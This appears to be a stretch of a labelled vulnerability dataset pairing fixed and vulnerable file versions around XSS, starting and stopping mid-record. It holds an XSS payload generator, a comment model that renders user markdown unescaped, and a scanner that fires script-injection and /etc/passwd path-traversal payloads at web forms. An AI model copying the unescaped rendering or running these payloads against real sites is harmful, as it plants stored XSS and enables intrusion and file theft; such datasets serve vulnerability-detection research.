from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return ""<script>alert(/xss/)</script>""

    def img(self):
        payload = ""<img src='%s'></img>"" % self.url
        return payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",1,xss
8,88,fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d,"models/comment.py/n/nimport asyncio

import mistune
import markupsafe
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = markupsafe.escape(await self.content)
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )
/n/n/n",0,xss
9,89,fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d,"/models/comment.py/n/nimport asyncio

import mistune
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = await self.content
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )
/n/n/n",1,xss
10,78,ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e,"readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",0,xss
11,79,ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e,"/readthedocs/search/tests/test_xss.py/n/nimport pytest

from readthedocs.search.documents import PageDocument


@pytest.mark.django_db
@pytest.mark.search
class TestXSS:

    def test_facted_page_xss(self, client, project):
        query = 'XSS'
        page_search = PageDocument.faceted_search(query=query, user='')
        results = page_search.execute()
        expected = """"""
        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;
        """""".strip()

        hits = results.hits.hits
        assert len(hits) == 1  # there should be only one result

        inner_hits = hits[0]['inner_hits']

        domain_hits = inner_hits['domains']['hits']['hits']
        assert len(domain_hits) == 0  # there shouldn't be any results from domains

        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",1,xss
12,52,73d12b579a488013c561179bb95b1d45c2b48e2f,"scripts/beaxssf.py/n/n#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ ""<script>alert(1);</script>"", ""<script>prompt(1)</script>"",
                ""<img src=x onerror=prompt(/test/)>"",
                ""\""><script>alert(1);</script><div id=\""x"", ""</script><script>alert(1);</script>"",
                ""</title><script>alert(1);</script>"", ""<body background=\""javascript:alert(1)\"">"",
                ""<img src=test123456.jpg onerror=alert(1)>""]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] XSS check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print ""[+] Target is VULNERABLE""
            print ""Url: "" + url
            print ""Parameters: %s\n"" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] LFI check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print ""[+] Target is VULNERABLE""
                print ""Url: "" + url
                print ""Parameters: %s\n"" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url, scanopt):
    print ""[+] Start scan""
    rtype=""""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = """"
    form_counter = 0

    try:
        with open(fname, ""r"") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find(""</form>"") >=0:
                    has_form=0
                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):
                        if scanopt.find(""--checkxss"") == 0 or scanopt.find(""--all"") == 0:
                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        if scanopt.find(""--checklfi"") == 0 or scanopt.find(""--all"") == 0:
                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=[""\'](\w+)[""\']', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=[""\'](\w+)[""\']', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=[""\']([\w\/\.\-\#\:]+)[""\']', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=[""\']([\w\/\.\-]+)[""\']', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""""
                    else:
                        page=m_action.group(1)
                    rtype=""get""
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print ""[+] Form detected. Method "" + rtype.upper()

    except Exception, e:
        print ""[-] scan_for_forms(): Error "" + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def help():
    print ""--checkxss\t\tcheck webpage for XSS vunerabilities""
    print ""--checklfi\t\tcheck webpage for local file inclusion (LFI) vulnerabilities""
    print ""--all\t\t\tthe tool will scan for both XSS and LFI vulnerabilities (default)""
    print ""\nExamples:""
    print ""program http://example.com/guestbook\t\t\tit will check for both XSS and LFI""
    print ""program --checkxss http://example.com/guestbook\t\tit will check only for XSS""

###MAIN###
if __name__ == ""__main__"":
    print ""BEstAutomaticXSSFinder v1.0""
    print ""DISCLAIMER: For testing purposes only!\n""

    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print ""program [scan options] [url]\n""
        help()
        exit()

    scanopt =""--all""
    url = """"
    
    if sys.argv[1].find(""http"") == 0:
        url = sys.argv[1]
        if len(sys.argv) == 3:
            scanopt = sys.argv[2]
    else:
        if len(sys.argv) == 3:
            if sys.argv[1].find(""--check"") == 0:
                scanopt = sys.argv[1]
                url = sys.argv[2]

    if url.find(""http"") != 0:
        print ""[-] Invalid target""
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print ""[-] Can't get host information""
        exit()

    print ""[+] Host acquired "" + host
    print ""[+] Retrieve page""
    try:
        r = requests.get(url)
        s = r.content.replace("">"", "">\n"")

        #good to have a local copy for testing
        with open(""tmpage.txt"", ""w"") as f:
            f.write(s)

        scan_for_forms(""tmpage.txt"", host, url, scanopt)
        if DEBUG == 0:
            os.remove(""tmpage.txt"")
    except Exception, e:
        print ""[-] Main(): Error "" + str(e)

print ""[*] Done""
/n/n/n",0,xss
13,53,73d12b579a488013c561179bb95b1d45c2b48e2f,"/scripts/beaxssf.py/n/n#! python
###############################################
#   BEstAutomaticXSSFinder                    #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0
xss_attacks = [ ""<script>alert(1);</script>"", ""<img src=x onerror=prompt(/test/)>"",
                ""\""><script>alert(1);</script><div id=\""x"", ""</script><script>alert(1);</script>"",
                ""</title><script>alert(1);</script>"", ""<body background=\""javascript:alert(1)\"">"",
                ""<img src=test123456.jpg onerror=alert(1)>""]

lfi_attacks = [
                #linux
                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
                '../../../../../etc/passwd', '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',
                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',
                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',

                #windows
                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',
                '../../../../../boot.ini', '../../../../../../boot.ini',
                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',
                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',
                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',
                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',
                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',
                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'
                ]

lfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']

def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global xss_attacks
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] XSS check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for xss in xss_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = xss
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        if r.content.find(xss)>=0:
            print ""[+] Target is VULNERABLE""
            print ""Url: "" + url
            print ""Parameters: %s\n"" % str(post_params)

            #comment out the return if you want all the findings
            return
    return

def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):
    global lfi_attacks
    global lfi_expect
    global DEBUG
    if page.find(""http://"") == 0 or page.find(""https://"") == 0:
        furl = page
    else:
        if _url.find(""https://"") == 0:
            furl = ""https://"" + host + ""/"" + page
        else:
            furl = ""http://"" + host + ""/"" + page

    print ""[+] LFI check for: "" + furl
    if DEBUG == 1:
        print ""Params: ""
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for lfi in lfi_attacks:
        post_params={}
        counter+=1
        parameters = """"
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = lfi
                else:
                    post_params[params[j]] = 0

        #add any hidden parameters
        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
            for i in range(0,len(hidden_param_name)):
                post_params[hidden_param_name[i]] = hidden_param_value[i]

        if method.find(""get"") == 0:
            r=requests.get(url = furl, params = post_params)
        else:
            r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open(""response_"" + str(form_counter) + ""_"" + str(counter) + "".html"", ""w"") as f:
                f.write(r.content)

        for lfi_result in lfi_expect:
            if r.content.find(lfi_result)>=0:
                print ""[+] Target is VULNERABLE""
                print ""Url: "" + url
                print ""Parameters: %s\n"" % str(post_params)

                #comment out the return if you want all the findings
                return
    return


def scan_for_forms(fname, host, url):
    print ""[+] Start scan""
    rtype=""""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = """"
    form_counter = 0
    try:
        with open(fname, ""r"") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find(""</form>"") >=0:
                    has_form=0
                    if len(page) > 0 and len(params) > 0:
                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)
                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=""(\w+)""', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=""(\w+)""', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>""', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=""([\w\/\.\-\#\:]+)""', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=""([\w\/\.\-]+)""', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""""
                    else:
                        page=m_action.group(1)
                    rtype=""get""
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print ""[+] Form detected. Method "" + rtype.upper()

    except Exception, e:
        print ""[-] scan_for_forms(): Error "" + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def banner():
    print ""BEstAutomaticXSSFinder v1.0""
    print ""DISCLAIMER: For testing purposes only!\n""

###MAIN###
if __name__ == ""__main__"":
    banner()

    if len(sys.argv) != 2:
        print ""program [url]""
        exit()

    url = sys.argv[1]
    if url.find(""http"") != 0:
        print ""[-] Invalid target""
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print ""[-] Can't get host information""
        exit()

    print ""[+] Host acquired "" + host
    print ""[+] Retrieve page""
    try:
        r = requests.get(url)
        s = r.content.replace("">"", "">\n"")

        #good to have a local copy for testing
        with open(""tmpage.txt"", ""w"") as f:
            f.write(s)

        scan_for_forms(""tmpage.txt"", host, url)
        os.remove(""tmpage.txt"")
    except Exception, e:
        print ""[-] Main(): Error "" + str(e)

print ""[*] Done""
/n/n/n",1,xss
14,116,d20b8de6b838a490155218b2306c87f6060713a6,"xss.py/n/ntry:
	from flask import Flask,request
	from termcolor import colored
	from time import sleep
except:
